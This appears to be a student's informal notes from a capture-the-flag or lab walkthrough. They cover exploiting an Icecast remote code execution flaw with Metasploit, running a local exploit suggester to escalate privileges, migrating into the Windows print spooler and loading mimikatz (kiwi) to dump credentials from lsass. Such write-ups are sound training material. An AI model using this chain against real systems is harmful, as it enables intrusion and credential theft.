## We have the "Icecast" service that has the vulnerability that can lead to remote code exicution,
we will use the metasploit for exploiting the vulnerability:

search icecast
use 0
show options

set lhost => tun0 ip
set rhost => target ip

Q:What user was running that Icecast process?
command :: ps

Q:What build of Windows is the system?
sysinfo

###  run post/multi/recon/local_exploit_suggester` 
*This can appear to hang as it tests exploits and might take several minutes to complete*

we will background our current session ,

We will find the new exploit and set as the session : privious session:
this is because we want to point the new session to the previous exploit:

Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

 ###### In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and::
::it'll restart if we crash it! 

1:Migrate to this process now with the command `migrate -N PROCESS_NAME`
2: dump the passwords using "mimikatz" ::: load kiwi
Now we can use the help menu , it will show us the commads for the kiwi tool:
